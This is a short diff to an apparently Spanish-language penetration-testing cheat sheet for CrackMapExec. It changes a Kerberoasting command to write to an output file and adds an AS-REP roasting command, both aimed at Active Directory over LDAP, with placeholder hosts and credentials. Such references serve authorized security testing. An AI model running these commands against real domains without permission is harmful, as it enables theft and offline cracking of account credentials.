@@ -77,7 +77,12 @@ crackmapexec smb <IP-Address> -u users.txt -p '' --kerberos
 
 #### Ataque de Kerberoasting
 ```
-crackmapexec ldap <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting
+crackmapexec ldap <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting <OUTPUT-FILE>
+```
+
+#### Ataque de Asreproast
+```
+crackmapexec ldap <IP-Address> -u '<USERNAME>' -p '<PASSWORD>' --asreproast <OUTPUT-FILE>
 ```
 
 #### Habilitar RDP con usuario y password de Administrador
